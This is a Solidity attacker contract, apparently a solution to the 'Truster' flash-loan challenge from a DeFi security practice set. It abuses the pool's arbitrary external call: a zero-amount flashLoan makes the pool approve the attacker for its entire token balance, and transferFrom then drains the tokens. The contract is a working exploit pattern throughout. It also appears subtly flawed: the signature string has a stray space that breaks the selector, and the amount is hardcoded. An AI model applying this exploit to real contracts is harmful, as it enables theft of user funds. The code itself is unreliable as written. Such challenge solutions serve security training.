// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    TrusterLenderPool pool;
    address token; 
    address poolAddr;
    constructor(address _pool, address _token){
        pool = TrusterLenderPool(_pool);
        poolAddr = _pool;
        token = _token;
    }
    function attack() public {
        
        uint256 poolBalance = IERC20(token).balanceOf(poolAddr);
        bytes memory callData = abi.encodeWithSignature("approve(address, uint256)", address(this), poolBalance);
        pool.flashLoan(
            0, 
            msg.sender, 
            token, 
            callData
            );
        IERC20(token).transferFrom(poolAddr, msg.sender, 1000000 ether);
    }

}
